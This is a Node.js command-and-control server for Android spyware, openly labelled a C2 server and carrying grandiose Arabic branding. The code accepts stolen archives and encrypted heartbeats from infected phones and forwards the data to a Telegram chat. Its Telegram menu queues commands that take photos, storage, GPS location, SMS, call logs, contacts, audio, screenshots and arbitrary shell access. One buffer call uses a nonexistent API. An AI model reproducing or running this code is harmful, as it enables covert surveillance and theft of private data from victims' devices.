// =========================================================================
// ⚡ مملكة ناصر دين الله الكلعي ⚡ - Uranium Fist Supreme C2 Server v8.0
// السلطان: ناصر دين الله الكلعي 💀 | السيادة الرقمية المطلقة والتشغيل العسكري
// =========================================================================
require('dotenv').config();
const express = require('express');
const telegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const crypto = require('crypto');

const token = process.env.TG_TOKEN || process.env.TELEGRAM_TOKEN;
const chatId = process.env.TG_ID || process.env.TELEGRAM_CHAT_ID;

if (!token || !chatId) {
    console.error('[-] Critical Error: Telegram credentials missing in environment.');
    process.exit(1);
}

const STORAGE_DIR = path.join(__dirname, 'uranium_supreme_storage');
if (!fs.existsSync(STORAGE_DIR)) fs.mkdirSync(STORAGE_DIR, { recursive: true });

const db = new sqlite3.Database('./uranium_core_v8_supreme.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS nodes (id TEXT PRIMARY KEY, model TEXT, last_seen INTEGER)`);
    db.run(`CREATE TABLE IF NOT EXISTS tasks (id INTEGER PRIMARY KEY AUTOINCREMENT, node_id TEXT, action TEXT, payload TEXT, status TEXT)`);
});

const app = express();
const appBot = new telegramBot(token, { polling: true });

// مفتاح التشفير العسكري المطابق لتطبيق الأندرويد
const ENCRYPTION_KEY = "UraniumIronFistSupremeSecurityKey2026!";

function decryptPayload(encryptedBase64) {
    try {
        const key = crypto.createHash('sha256').update(ENCRYPTION_KEY).digest();
        const decipher = crypto.createDecipheriv('aes-256-ecb', key, null);
        let decrypted = decipher.update(encryptedBase64, 'base64', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch (e) {
        return null;
    }
}

appBot.on('polling_error', (error) => {
    if (error.code !== 'ETELEGRAM' || error.message.indexOf('409 Conflict') === -1) {
        console.log(`[Telegram Polling Warning]: ${error.code} - ${error.message}`);
    }
});

app.use(express.text({ type: 'application/json', limit: '4096mb' }));
app.use(express.raw({ type: 'application/octet-stream', limit: '20000mb' }));

async function sendTg(msg, options = {}) {
    try {
        return await appBot.sendMessage(chatId, msg, { parse_mode: 'HTML', ...options });
    } catch (e) {
        console.error('TG Error:', e.message);
    }
}

async function sendTgDocumentSmart(filePath, caption) {
    if (!fs.existsSync(filePath)) return;
    const stats = fs.statSync(filePath);
    const fileSizeMB = stats.size / (1024 * 1024);
    const CHUNK_LIMIT = 45 * 1024 * 1024; // 45MB حد تيليجرام الآمن

    if (stats.size <= CHUNK_LIMIT) {
        try {
            await appBot.sendDocument(chatId, filePath, { caption: `${caption}\n⚔️ [تنفيذ وإشراف السلطان ناصر دين الله الكلعي]` });
        } catch (e) {
            await sendTg(`⚠️ فشل إرسال الملف مباشرة، تم حفظه محلياً في <code>uranium_supreme_storage/${path.basename(filePath)}</code> (${fileSizeMB.toFixed(2)} MB).`);
        }
    } else {
        await sendTg(`📦 الملف <b>${path.basename(filePath)}</b> ضخم جداً (${fileSizeMB.toFixed(2)} MB). جاري تقسيمه وإرساله أجزاء متسلسلة بأمر السلطان...`);
        const fd = fs.openSync(filePath, 'r');
        const buffer = Buffer.allocate(CHUNK_LIMIT);
        let partNum = 1;
        let bytesRead;

        while ((bytesRead = fs.readSync(fd, buffer, 0, CHUNK_LIMIT, null)) > 0) {
            const partPath = `${filePath}.part${String(partNum).padStart(3, '0')}`;
            fs.writeFileSync(partPath, buffer.slice(0, bytesRead));
            try {
                await appBot.sendDocument(chatId, partPath, { caption: `${caption} - الجزء (${partNum})\n⚔️ [مملكة ناصر دين الله الكلعي]` });
            } catch (err) {
                await sendTg(`⚠️ فشل إرسال الجزء ${partNum}`);
            }
            try { fs.unlinkSync(partPath); } catch (e) {}
            partNum++;
        }
        fs.closeSync(fd);
    }
}

app.get('/', (req, res) => {
    res.status(200).send(`<html><body style="background:#000;color:#00ff66;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️] URANIUM SUPREME C2 SERVER v8.0 ONLINE (السلطان ناصر دين الله الكلعي) [☢️]</h1></body></html>`);
});

// مسار استقبال الأرشيفات والبيانات الخام المشفرة والضخمة
app.post('/api/v4/iron/supreme-ingest', async (req, res) => {
    try {
        const nodeId = req.headers['x-node-id'] || 'supreme_node';
        const nodeModel = req.headers['x-node-model'] || 'Unknown Model';
        const fileName = req.headers['x-file-name'] || `supreme_archive_${Date.now()}.zip`;

        db.run(`INSERT OR REPLACE INTO nodes (id, model, last_seen) VALUES (?, ?, ?)`, [nodeId, nodeModel, Date.now()]);

        if (!req.body || !Buffer.isBuffer(req.body)) {
            return res.status(400).json({ status: 'BAD_BINARY_PAYLOAD' });
        }

        const safeName = path.basename(fileName);
        const controllerFilePath = path.join(STORAGE_DIR, `${nodeId}_${Date.now()}_${safeName}`);
        fs.writeFileSync(controllerFilePath, req.body);

        const stats = fs.statSync(controllerFilePath);
        const fileSizeMB = stats.size / (1024 * 1024);

        console.log(`[+] SUPREME SUCCESS: File saved -> ${controllerFilePath} (${fileSizeMB.toFixed(2)} MB)`);
        await sendTg(`☢️ <b>حصاد سيبراني عسكري جديد تم حفظه:</b>\n📱 العقدة: <code>${nodeId}</code> (${nodeModel})\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)\n👑 [السلطان ناصر دين الله الكلعي]`);

        await sendTgDocumentSmart(controllerFilePath, `☠️ أرشيف الحصاد العسكري: <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)`);

        res.status(200).json({ status: 'OK', message: 'SUPREME_SAVED_AND_FORWARDED' });
    } catch (e) {
        console.error('Supreme Ingest Error:', e);
        res.status(500).json({ status: 'SERVER_ERROR', message: e.message });
    }
});

// مسار الاتصال والنبضات المشفرة (Stream / Heartbeat / Command Dispatcher)
app.post('/api/v4/iron/supreme-stream', async (req, res) => {
    try {
        const nodeId = req.headers['x-node-id'] || 'supreme_node';
        const nodeModel = req.headers['x-node-model'] || 'Unknown Model';

        db.run(`INSERT OR REPLACE INTO nodes (id, model, last_seen) VALUES (?, ?, ?)`, [nodeId, nodeModel, Date.now()]);
        
        let bodyJson;
        try {
            bodyJson = JSON.parse(req.body);
        } catch (err) {
            return res.status(400).json({ status: 'BAD_PAYLOAD', error: err.message });
        }

        const encryptedPayload = bodyJson.payload;
        if (!encryptedPayload) {
            return res.status(400).json({ status: 'MISSING_ENCRYPTED_PAYLOAD' });
        }

        const decryptedString = decryptPayload(encryptedPayload);
        if (!decryptedString) {
            return res.status(400).json({ status: 'DECRYPTION_FAILED' });
        }

        let payload;
        try {
            payload = JSON.parse(decryptedString);
        } catch (e) {
            payload = { type: 'RAW_DECRYPTED', text: decryptedString };
        }

        let directive = { status: 'ACK', task: null };

        if (payload.type === 'SUPREME_HEARTBEAT') {
            // نبضة اتصال سليمة ومؤمنة
        }

        db.get(`SELECT * FROM tasks WHERE node_id = ? AND status = 'PENDING' LIMIT 1`, [nodeId], (err, row) => {
            if (row) {
                directive.task = { id: row.id, action: row.action, payload: JSON.parse(row.payload || '{}') };
                db.run(`UPDATE tasks SET status = 'SENT' WHERE id = ?`, [row.id]);
            }
            res.status(200).json(directive);
        });
    } catch (e) {
        res.status(500).json({ status: 'SERVER_ERROR', message: e.message });
    }
});

appBot.on('message', async (msg) => {
    if (String(msg.chat.id) !== String(chatId)) return;
    const text = msg.text;

    if (text === '/start') {
        db.all(`SELECT id, model, last_seen FROM nodes`, async (err, rows) => {
            if (!rows || rows.length === 0) {
                await sendTg(`⚠️ <b>لا توجد عقد يورانيوم متصلة حالياً في النسخة v8.0.</b>\n(تنفيذ بأمر السلطان ناصر دين الله الكلعي)`);
                return;
            }

            let inlineKeyboard = [];
            rows.forEach(node => {
                inlineKeyboard.push([{ text: `☢️ [Supreme] ${node.model} (${node.id.substring(0, 6)})`, callback_data: `menu_${node.id}` }]);
            });

            await sendTg(`👑 <b>مملكة السلطان ناصر دين الله الكلعي - غرفة القيادة العليا v8.0:</b>\nاختر العقدة للسيطرة العسكرية التامة:`, {
                reply_markup: { inline_keyboard: inlineKeyboard }
            });
        });
    }
});

appBot.on('callback_query', async (query) => {
    const data = query.data;
    const msg = query.message;

    if (data.startsWith('menu_')) {
        const nodeId = data.replace('menu_', '');
        const keyboard = {
            inline_keyboard: [
                [
                    { text: '☢️ حصاد الكاميرا الشامل (DCIM)', callback_data: `cmd_EXTRACT_CAMERA_ZIP_${nodeId}` },
                    { text: '📥 التخزين الضخم Download (12GB+)', callback_data: `cmd_EXTRACT_STORAGE_ZIP_${nodeId}` }
                ],
                [
                    { text: '📍 تحديد الموقع بدقة خارقة (GPS)', callback_data: `cmd_EXTRACT_LOCATION_${nodeId}` },
                    { text: '📱 قائمة التطبيقات المثبتة كاملة', callback_data: `cmd_EXTRACT_APPS_${nodeId}` }
                ],
                [
                    { text: '📨 الرسائل الواردة (SMS)', callback_data: `cmd_EXTRACT_SMS_${nodeId}` },
                    { text: '📞 سجل المكالمات التفصيلي', callback_data: `cmd_EXTRACT_CALLS_${nodeId}` }
                ],
                [
                    { text: '📇 دليل جهات الاتصال', callback_data: `cmd_EXTRACT_CONTACTS_${nodeId}` },
                    { text: '🎤 سحب التسجيلات الصوتية', callback_data: `cmd_EXTRACT_AUDIO_${nodeId}` }
                ],
                [
                    { text: '💬 تنفيذ أمر شل مخصص (Shell)', callback_data: `cmd_SHELL_${nodeId}` },
                    { text: '🖼️ لقطات الشاشة الحية', callback_data: `cmd_EXTRACT_SCREENSHOT_ZIP_${nodeId}` }
                ],
                [{ text: '🔙 القائمة الرئيسية', callback_data: 'back_home' }]
            ]
        };
        await appBot.editMessageText(`🎯 <b>العقدة تحت السيادة المطلقة للسلطان ناصر دين الله الكلعي:</b> <code>${nodeId}</code>`, {
            chat_id: msg.chat.id,
            message_id: msg.message_id,
            parse_mode: 'HTML',
            reply_markup: keyboard
        });
    } else if (data.startsWith('cmd_')) {
        const parts = data.split('_');
        const targetNodeId = parts.pop();
        const action = parts.slice(1).join('_');

        db.run(`INSERT INTO tasks (node_id, action, payload, status) VALUES (?, ?, '{}', 'PENDING')`, [targetNodeId, action], async () => {
            await appBot.answerCallbackQuery(query.id, { text: `☢️ تم إطلاق الأمر العسكري [${action}] بأمر السلطان!` });
            await sendTg(`⚡ <b>أمر سيطرة عسكري [<code>${action}</code>] قيد التنفيذ للعقدة <code>${targetNodeId}</code>...</b>`);
        });
    } else if (data === 'back_home') {
        await appBot.deleteMessage(msg.chat.id, msg.message_id);
        await sendTg(`أرسل <code>/start</code> لإظهار قائمة عقد اليورانيوم العسكرية النشطة.`);
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`[+] Uranium Supreme C2 Server v8.0 Online on port ${PORT} (السلطان ناصر دين الله الكلعي)`));
